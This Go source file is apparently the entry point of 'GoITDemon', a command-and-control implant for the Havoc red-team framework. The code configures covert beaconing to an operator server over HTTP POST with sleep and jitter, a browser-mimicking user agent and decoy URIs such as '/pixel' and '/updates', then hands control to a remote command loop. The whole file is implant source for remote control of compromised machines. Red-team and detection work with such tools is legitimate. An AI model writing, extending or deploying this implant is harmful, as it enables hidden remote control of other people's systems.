package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"runtime"
	"strconv"
	"strings"

	"github.com/HavocFramework/GoITDemon/pkg/agent"
	"github.com/HavocFramework/GoITDemon/pkg/commands"
	"github.com/HavocFramework/GoITDemon/pkg/transport"
)

const (
	// Agent identification
	AGENT_TYPE    = "GoITDemon"
	AGENT_VERSION = "1.0.0"
	MAGIC_VALUE   = 0xDEADBEEF // Use standard Demon magic value for compatibility

	// Default configuration - will be replaced during build
	DEFAULT_SLEEP     = 5000
	DEFAULT_JITTER    = 10
	DEFAULT_HOST      = "127.0.0.1"
	DEFAULT_PORT      = 443
	DEFAULT_SECURE    = true
	DEFAULT_USERAGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

func main() {
	// Initialize the IT Demon agent
	fmt.Printf("[+] Starting %s v%s\n", AGENT_TYPE, AGENT_VERSION)
	fmt.Printf("[+] Platform: %s/%s\n", runtime.GOOS, runtime.GOARCH)

	// Parse command line arguments for configuration override
	config := parseConfig()

	// Generate random agent ID
	agentID := generateAgentID()
	fmt.Printf("[+] Agent ID: %08x\n", agentID)

	// Initialize transport with configuration
	transportConfig := &transport.Config{
		Method:    "POST",
		UserAgent: config.UserAgent,
		Hosts: []transport.Host{
			{Address: config.Host, Port: config.Port, Secure: config.Secure},
		},
		URIs: []string{
			"/fwlink",
			"/pixel",
			"/updates",
		},
	}

	// Create transport instance
	trans, err := transport.NewHTTPTransport(transportConfig)
	if err != nil {
		log.Fatalf("[-] Failed to create transport: %v", err)
	}

	// Initialize command handler
	cmdHandler := commands.NewHandler()

	// Create agent instance
	agentInstance := &agent.Agent{
		ID:         agentID,
		Type:       AGENT_TYPE,
		Version:    AGENT_VERSION,
		MagicValue: MAGIC_VALUE,
		Transport:  trans,
		CmdHandler: cmdHandler,
		SleepTime:  config.Sleep,
		Jitter:     config.Jitter,
	}

	// Initialize agent
	if err := agentInstance.Initialize(); err != nil {
		log.Fatalf("[-] Failed to initialize agent: %v", err)
	}

	// Start main agent loop
	fmt.Println("[+] Agent initialized, starting main loop...")
	agentInstance.Run()
}

type Config struct {
	Sleep     int
	Jitter    int
	Host      string
	Port      int
	Secure    bool
	UserAgent string
}

func parseConfig() Config {
	config := Config{
		Sleep:     DEFAULT_SLEEP,
		Jitter:    DEFAULT_JITTER,
		Host:      DEFAULT_HOST,
		Port:      40056, // Default port as int
		Secure:    DEFAULT_SECURE,
		UserAgent: DEFAULT_USERAGENT,
	}

	// Check for environment variable overrides
	if sleep := os.Getenv("GOITDEMON_SLEEP"); sleep != "" {
		if val, err := strconv.Atoi(sleep); err == nil {
			config.Sleep = val * 1000 // Convert to milliseconds
		}
	}

	if jitter := os.Getenv("GOITDEMON_JITTER"); jitter != "" {
		if val, err := strconv.Atoi(jitter); err == nil {
			config.Jitter = val
		}
	}

	if host := os.Getenv("GOITDEMON_HOST"); host != "" {
		config.Host = host
	}

	if port := os.Getenv("GOITDEMON_PORT"); port != "" {
		if val, err := strconv.Atoi(port); err == nil {
			config.Port = val
		}
	}

	if secure := os.Getenv("GOITDEMON_SECURE"); secure != "" {
		config.Secure = strings.ToLower(secure) == "true"
	}

	if ua := os.Getenv("GOITDEMON_USERAGENT"); ua != "" {
		config.UserAgent = ua
	}

	return config
}

func generateAgentID() uint32 {
	var id uint32
	binary.Read(rand.Reader, binary.LittleEndian, &id)
	return id
}
